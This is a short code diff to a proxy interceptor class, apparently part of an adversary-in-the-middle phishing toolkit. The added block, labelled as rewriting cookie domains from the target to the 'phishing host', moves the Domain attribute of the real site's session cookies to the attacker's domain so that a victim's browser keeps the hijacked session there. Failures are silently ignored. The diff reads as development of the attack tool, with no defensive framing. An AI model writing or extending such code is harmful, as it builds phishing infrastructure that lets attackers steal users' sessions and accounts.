@@ -172,6 +172,18 @@ class VantaInterceptor:
                     flow.response.cookies[rule.name] = (value, attrs)
         except Exception:
             pass
+        # 2b bis. Auto-rewrite cookie domain target -> phishing host (fallback)
+        try:
+            ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
+            tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
+            if ph_host and tgt_host:
+                for name, (value, attrs) in list(flow.response.cookies.items()):
+                    dom = attrs.get("domain")
+                    if dom and (dom == tgt_host or dom.endswith("." + tgt_host)):
+                        attrs["domain"] = ph_host
+                        flow.response.cookies[name] = (value, attrs)
+        except Exception:
+            pass
 
         # 2c. Header rules
         try:
